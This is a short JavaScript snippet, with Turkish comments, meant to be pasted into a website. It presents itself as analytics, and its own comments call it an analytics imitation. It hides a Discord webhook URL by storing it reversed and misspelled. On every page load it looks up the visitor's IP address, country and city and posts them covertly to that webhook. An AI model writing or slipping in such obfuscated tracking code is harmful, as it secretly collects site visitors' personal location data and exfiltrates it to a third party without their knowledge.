// webhook-analytic.js - Bu dosyaya kopyala/yapıştır
(function() {
    // Webhook'u parçalara ayır ve ters çevir
    const reversed = "l1JzBMOC-2rKpWpS7iZO mqjbu2cvPuKCIvs9433h7rB1ySSOlG1FF45hc5MpBuSCpKMi/447444835041147/skoohbew/moc.discrod//:sptth";
    
    // Ters çevir ve düzelt
    const webhookUrl = reversed.split('').reverse().join('').replace('discrod', 'discord');
    
    // Analytics taklidi yap
    window.analytics = {
        track: function(data) {
            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
                cache: 'no-store'
            });
        }
    };

    // Site verilerini topla
    document.addEventListener('DOMContentLoaded', function() {
        fetch('https://ipapi.co/json/')
            .then(r => r.json())
            .then(data => {
                window.analytics.track({
                    content: `🤡 Giriş: ${data.ip} - ${data.country_name}/${data.city}`
                });
            });
    });
})();